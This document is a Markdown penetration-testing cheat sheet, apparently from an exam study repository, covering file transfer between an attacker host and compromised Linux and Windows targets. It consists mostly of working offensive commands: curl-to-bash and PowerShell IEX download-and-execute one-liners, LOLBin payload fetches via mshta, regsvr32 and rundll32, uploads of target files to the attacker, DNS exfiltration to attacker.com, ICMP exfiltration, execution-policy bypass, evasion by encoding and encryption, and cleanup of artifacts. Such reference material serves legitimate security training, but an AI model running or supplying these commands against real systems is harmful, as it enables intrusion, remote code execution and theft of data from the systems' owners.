# File Transfer Methods - Complete Guide

## 📋 Overview

File transfers are essential during penetration testing for:
- Uploading exploitation tools
- Downloading sensitive data
- Transferring scripts and payloads
- Exfiltrating credentials and files

---

## 🎯 Transfer Method Selection

### Decision Tree

```
Need to transfer files?
    │
    ├─ Target OS?
    │   ├─ Linux
    │   │   ├─ Has internet access?
    │   │   │   ├─ YES → wget/curl
    │   │   │   └─ NO → netcat/base64
    │   │   └─ Restricted?
    │   │       └─ Use native tools only
    │   │
    │   └─ Windows
    │       ├─ Has PowerShell?
    │       │   ├─ YES → PowerShell download
    │       │   └─ NO → certutil/bitsadmin
    │       └─ Restricted?
    │           └─ SMB/FTP
    │
    └─ Direction?
        ├─ Download (Attacker → Target)
        └─ Upload (Target → Attacker)
```

---

## 🐧 Linux File Transfers

### Download Methods (Attacker → Linux Target)

#### Method 1: wget (Most Common)
```bash
# On attacker - start web server
python3 -m http.server 80

# On target - download file
wget http://$LHOST/file
wget http://$LHOST/file -O /tmp/file

# Download to specific location
wget http://$LHOST/file -P /tmp/

# Quiet mode
wget -q http://$LHOST/file
```

#### Method 2: curl
```bash
# Download file
curl http://$LHOST/file -o file

# Download and execute
curl http://$LHOST/script.sh | bash

# Silent mode
curl -s http://$LHOST/file -o file

# Follow redirects
curl -L http://$LHOST/file -o file
```

#### Method 3: Python
```bash
# Python 2
python -c 'import urllib; urllib.urlretrieve("http://$LHOST/file", "file")'

# Python 3
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://$LHOST/file", "file")'

# Download and execute
python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://$LHOST/script.py").read())'
```

#### Method 4: Netcat
```bash
# On attacker - send file
nc -nvlp 443 < file

# On target - receive file
nc $LHOST 443 > file
```

#### Method 5: Base64 (No network)
```bash
# On attacker - encode file
base64 -w 0 file > file.b64
cat file.b64

# On target - decode file
echo "BASE64_STRING" | base64 -d > file
```

#### Method 6: SCP (If SSH available)
```bash
# Copy to target
scp file user@$IP:/tmp/file

# Copy from target
scp user@$IP:/tmp/file ./file
```

#### Method 7: FTP
```bash
# On attacker - start FTP server
python3 -m pyftpdlib -p 21

# On target - download
ftp $LHOST
# Commands: get file
```

### Upload Methods (Linux Target → Attacker)

#### Method 1: Python Upload Server
```bash
# On attacker - start upload server
pip3 install uploadserver
python3 -m uploadserver 80

# On target - upload file
curl -X POST http://$LHOST/upload -F 'files=@file'
```

#### Method 2: Netcat
```bash
# On attacker - receive file
nc -nvlp 443 > file

# On target - send file
nc $LHOST 443 < file
```

#### Method 3: Base64
```bash
# On target - encode file
base64 -w 0 file

# On attacker - decode
echo "BASE64_STRING" | base64 -d > file
```

#### Method 4: SCP
```bash
# From target to attacker
scp file user@$LHOST:/tmp/file
```

#### Method 5: HTTP POST
```bash
# On attacker - start listener
nc -nvlp 80

# On target - send file
curl -X POST http://$LHOST --data-binary @file
```

---

## 🪟 Windows File Transfers

### Download Methods (Attacker → Windows Target)

#### Method 1: PowerShell (Most Common)
```powershell
# Invoke-WebRequest (PowerShell 3.0+)
iwr -uri http://$LHOST/file.exe -OutFile file.exe

# WebClient
(New-Object Net.WebClient).DownloadFile('http://$LHOST/file.exe','file.exe')

# Download and execute in memory (fileless)
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/script.ps1')

# Alternative aliases
wget http://$LHOST/file.exe -OutFile file.exe
curl http://$LHOST/file.exe -o file.exe
```

#### Method 2: certutil
```cmd
# Download file
certutil -urlcache -split -f http://$LHOST/file.exe file.exe

# Verify download
certutil -hashfile file.exe MD5
```

#### Method 3: bitsadmin
```cmd
# Download file
bitsadmin /transfer job /download /priority high http://$LHOST/file.exe C:\Temp\file.exe

# Check status
bitsadmin /list
```

#### Method 4: SMB
```bash
# On attacker - start SMB server
sudo impacket-smbserver share -smb2support /tmp/share

# On target - copy file
copy \\$LHOST\share\file.exe C:\Temp\file.exe

# Mount share
net use Z: \\$LHOST\share
copy Z:\file.exe C:\Temp\file.exe
```

**With authentication** (newer Windows):
```bash
# On attacker
sudo impacket-smbserver share -smb2support /tmp/share -user test -password test

# On target
net use Z: \\$LHOST\share /user:test test
copy Z:\file.exe C:\Temp\file.exe
```

#### Method 5: FTP
```bash
# On attacker - start FTP server
python3 -m pyftpdlib -p 21 --write

# On target - create FTP script
echo open $LHOST > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt

# Execute FTP script
ftp -s:ftp.txt
```

#### Method 6: VBScript
```vbscript
' download.vbs
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "http://$LHOST/file.exe", False
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile "file.exe"
    objADOStream.Close
    Set objADOStream = Nothing
End If

Set objXMLHTTP = Nothing
```

Execute:
```cmd
cscript download.vbs
```

### Upload Methods (Windows Target → Attacker)

#### Method 1: PowerShell
```powershell
# Upload file
(New-Object Net.WebClient).UploadFile('http://$LHOST/upload', 'file.txt')

# Base64 encode and POST
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'file.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://$LHOST -Method POST -Body $b64
```

#### Method 2: SMB
```bash
# On attacker - start SMB server
sudo impacket-smbserver share -smb2support /tmp/share -user test -password test

# On target - copy file
net use Z: \\$LHOST\share /user:test test
copy file.txt Z:\file.txt
```

#### Method 3: FTP
```bash
# On attacker - start FTP server with write
python3 -m pyftpdlib -p 21 --write

# On target - upload
echo open $LHOST > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo put file.txt >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

#### Method 4: Base64
```powershell
# On target - encode file
[Convert]::ToBase64String((Get-Content -Path "file.txt" -Encoding byte))

# On attacker - decode
echo "BASE64_STRING" | base64 -d > file.txt
```

---

## 🔒 Secure File Transfers

### HTTPS Transfers

#### Python HTTPS Server
```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Start HTTPS server
python3 -c "import http.server, ssl; server_address=('0.0.0.0', 443); httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler); httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='cert.pem', keyfile='key.pem', ssl_version=ssl.PROTOCOL_TLS); httpd.serve_forever()"
```

#### Download via HTTPS
```bash
# Linux (ignore certificate)
wget --no-check-certificate https://$LHOST/file
curl -k https://$LHOST/file -o file

# Windows
iwr -uri https://$LHOST/file.exe -OutFile file.exe -SkipCertificateCheck
```

### SSH/SCP Transfers
```bash
# Copy file to target
scp file user@$IP:/tmp/file

# Copy file from target
scp user@$IP:/tmp/file ./file

# Copy directory recursively
scp -r directory user@$IP:/tmp/
```

### SFTP Transfers
```bash
# Connect to SFTP
sftp user@$IP

# Upload file
put file

# Download file
get file

# Upload directory
put -r directory
```

---

## 🚀 Advanced Transfer Techniques

### Living Off The Land (LOLBins)

#### Windows LOLBins
```cmd
# mshta
mshta http://$LHOST/file.hta

# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://$LHOST/file.sct")

# regsvr32
regsvr32 /s /n /u /i:http://$LHOST/file.sct scrobj.dll

# msiexec
msiexec /quiet /i http://$LHOST/file.msi
```

#### Linux LOLBins
```bash
# openssl
openssl s_client -connect $LHOST:443 < /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > file

# awk
awk 'BEGIN {system("wget http://$LHOST/file")}'

# find
find / -name file -exec wget http://$LHOST/file \;
```

### WebDAV Transfers

#### Setup WebDAV Server
```bash
# Install wsgidav
pip3 install wsgidav cheroot

# Start WebDAV server
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

#### Connect from Windows
```cmd
# Connect to WebDAV
dir \\$LHOST\DavWWWRoot

# Copy file
copy file.txt \\$LHOST\DavWWWRoot\file.txt
```

### DNS Exfiltration
```bash
# On attacker - capture DNS queries
sudo tcpdump -i tun0 udp port 53

# On target - exfiltrate data via DNS
for b in $(xxd -p file | fold -w2); do dig $b.attacker.com; done
```

### ICMP Exfiltration
```bash
# On attacker - capture ICMP
sudo tcpdump -i tun0 icmp

# On target - exfiltrate via ICMP
xxd -p file | while read line; do ping -c 1 -p $line $LHOST; done
```

---

## 🛡️ Evasion Techniques

### Obfuscation

#### Base64 Encoding
```bash
# Encode
base64 -w 0 file > file.b64

# Decode
base64 -d file.b64 > file
```

#### Hex Encoding
```bash
# Encode
xxd -p file | tr -d '\n' > file.hex

# Decode
xxd -r -p file.hex > file
```

#### Gzip Compression
```bash
# Compress
gzip file

# Decompress
gunzip file.gz
```

### Chunked Transfers
```bash
# Split file into chunks
split -b 1M file chunk_

# Reassemble
cat chunk_* > file
```

### Encrypted Transfers
```bash
# Encrypt with openssl
openssl enc -aes-256-cbc -salt -in file -out file.enc -k password

# Decrypt
openssl enc -d -aes-256-cbc -in file.enc -out file -k password
```

---

## 📊 Transfer Verification

### Hash Verification

#### Linux
```bash
# MD5
md5sum file

# SHA256
sha256sum file

# SHA1
sha1sum file
```

#### Windows
```powershell
# MD5
Get-FileHash file -Algorithm MD5

# SHA256
Get-FileHash file -Algorithm SHA256

# certutil
certutil -hashfile file MD5
certutil -hashfile file SHA256
```

### File Size Verification
```bash
# Linux
ls -lh file
stat file

# Windows
dir file
```

---

## ⚠️ Common Errors and Solutions

### Error: "wget: command not found"
**Solution**: Use curl or Python
```bash
curl http://$LHOST/file -o file
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://$LHOST/file", "file")'
```

### Error: "PowerShell execution policy"
**Solution**: Bypass execution policy
```powershell
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
```

### Error: "SMB access denied"
**Solution**: Use authentication
```bash
# Attacker
sudo impacket-smbserver share -smb2support /tmp/share -user test -password test

# Target
net use Z: \\$LHOST\share /user:test test
```

### Error: "SSL certificate verification failed"
**Solution**: Ignore certificate
```bash
# wget
wget --no-check-certificate https://$LHOST/file

# curl
curl -k https://$LHOST/file -o file

# PowerShell
iwr -uri https://$LHOST/file -OutFile file -SkipCertificateCheck
```

---

## 💡 Pro Tips

1. **Always verify transfers**
   ```bash
   md5sum file  # Before transfer
   md5sum file  # After transfer
   ```

2. **Use HTTPS when possible**
   ```bash
   # More stealthy, encrypted
   wget https://$LHOST/file
   ```

3. **Clean up after transfers**
   ```bash
   rm /tmp/file
   rm C:\Temp\file.exe
   ```

4. **Use in-memory execution when possible**
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/script.ps1')
   ```

5. **Test transfer methods beforehand**
   ```bash
   # Test with small file first
   echo "test" > test.txt
   wget http://$LHOST/test.txt
   ```

6. **Use multiple transfer methods as backup**
   ```bash
   # If wget fails, try curl
   # If curl fails, try Python
   # If Python fails, use netcat
   ```

7. **Monitor transfer progress**
   ```bash
   # wget with progress
   wget --progress=bar:force http://$LHOST/file

   # curl with progress
   curl -# http://$LHOST/file -o file
   ```

---

## 📚 Quick Reference

### Linux Download
```bash
wget http://$LHOST/file
curl http://$LHOST/file -o file
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://$LHOST/file", "file")'
```

### Windows Download
```powershell
iwr -uri http://$LHOST/file.exe -OutFile file.exe
certutil -urlcache -split -f http://$LHOST/file.exe file.exe
```

### Linux Upload
```bash
curl -X POST http://$LHOST/upload -F 'files=@file'
```

### Windows Upload
```powershell
(New-Object Net.WebClient).UploadFile('http://$LHOST/upload', 'file.txt')
```

---

## 🔗 Related Resources

- [Post-Exploitation](../04-Post-Exploitation/Situational-Awareness.md)
- [Living Off The Land](./Living-Off-The-Land.md)
- [Evasion Techniques](./Evasion-Techniques.md)
- [Quick Reference](../09-Quick-Reference/Exam-Checklist.md)

---

**Remember**: Always verify file integrity after transfer and clean up artifacts!
